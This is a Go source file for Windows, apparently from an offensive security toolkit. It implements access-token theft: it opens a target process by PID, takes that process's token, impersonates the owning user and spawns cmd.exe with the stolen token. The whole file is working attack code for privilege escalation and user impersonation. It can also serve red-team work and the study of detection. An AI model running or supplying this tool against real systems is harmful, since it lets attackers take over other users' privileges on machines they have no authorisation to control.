// +build windows

package main

import (
	"flag"
	"fmt"
	"log"
	privs "oddments/pkg/privs"
	"oddments/windows/process"
	"os"

	// oddments
	"oddments/windows/tokens"
)

var verbose bool
var debug bool

func main() {
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose output")
	flag.BoolVar(&debug, "debug", false, "Enable debug output")
	pid := flag.Uint("pid", 0, "The process ID to steal a token from")
	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()

	if *pid == 0 {
		flag.Usage()
	}

	// Display token information
	if debug {
		fmt.Println("[DEBUG] Retrieving Primary and Impersonation token information...")
	}
	whoami, err := tokens.WhoamiN()
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Printf("[-] Token WhoAmI:\n%s\n", whoami)
	}

	// Get a handle to the target process
	if debug {
		fmt.Println("[DEBUG] Calling OpenProcess...")
	}
	var PROCESS_QUERY_INFORMATION uint32 = 0x0400
	handle, err := process.OpenProcessN(uint32(*pid), PROCESS_QUERY_INFORMATION, true)
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Printf("[-] Got handle to PID %d: 0x%X\n", *pid, handle)
	}

	// Defer closing the process handle
	defer func() {
		if debug {
			fmt.Println("[DEBUG] Calling CloseHandle on the process handle...")
		}
		err = tokens.CloseHandleN(handle)
		if err != nil {
			log.Fatal(err)
		}
		if verbose {
			fmt.Println("[-] Successfully closed the process handle")
		}
	}()

	// Use the process handle to get its access token
	if debug {
		fmt.Println("[DEBUG] Calling OpenProcessToken...")
	}
	// These token privs are required to call CreateProcessWithToken later
	TOKEN_ASSIGN_PRIMARY := 0x0001
	TOKEN_DUPLICATE := 0x0002
	TOKEN_QUERY := 0x0008
	DesiredAccess := TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY

	token, err := tokens.OpenProcessTokenN(handle, DesiredAccess)
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Printf("[-] Got token for PID %d: 0x%X\n", *pid, token)
	}

	// Defer closing the token handle
	defer func() {
		if debug {
			fmt.Println("[DEBUG] Calling CloseHandle on the token handle...")
		}
		err = tokens.CloseHandleN(token)
		if err != nil {
			log.Fatal(err)
		}
		if verbose {
			fmt.Println("[-] Successfully closed the token handle")
		}
	}()

	// Apply the token to this process
	if debug {
		fmt.Println("[DEBUG] Calling tokens.ImpersonateLoggedOnUserN...")
	}
	err = tokens.ImpersonateLoggedOnUserN(token)
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Println("[-] Successfully applied the stolen token")
	}

	// Display token information
	if debug {
		fmt.Println("[DEBUG] Retrieving Primary and Impersonation token information...")
	}
	whoami, err = tokens.WhoamiG()
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Printf("[-] Token WhoAmI:\n%s\n", whoami)
	}

	// List stolen access token privileges
	if debug {
		fmt.Println("[DEBUG] Getting the current (calling) process access token privileges...")
		parentPrivs, err := privs.GetPrivileges(process.GetCurrentProcessTokenN())
		if err != nil {
			fmt.Printf("[!] %s\n", err)
		}
		fmt.Println("[-] Current (calling) process access token privileges:")
		for _, p := range parentPrivs {
			fmt.Printf("\t%s\n", p)
		}

		fmt.Println("[DEBUG] Getting stolen access token privileges...")
		privileges, err := privs.GetPrivileges(token)
		if err != nil {
			fmt.Printf("[!] %s\n", err)
		}
		fmt.Println("[-] Stolen access token privileges:")
		for _, p := range privileges {
			fmt.Printf("\t%s\n", p)
		}
	}

	// Create a process with the token
	if debug {
		fmt.Println("[DEBUG] Calling tokens.CreateProcessWithTokenN...")
	}
	err = tokens.CreateProcessWithTokenN(token, "cmd.exe", "")
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Println("[+] Successfully created a process with the stolen token")
	}

	// Revert to self - Drop the stolen token
	if debug {
		fmt.Println("[DEBUG] Calling tokens.RevertTotSelfN()...")
	}
	err = tokens.RevertToSelfN()
	if err != nil {
		fmt.Printf("[!] %s\n", err)
	}
	if verbose {
		fmt.Println("[-] Successfully reverted to self and dropped the stolen token")
	}
}
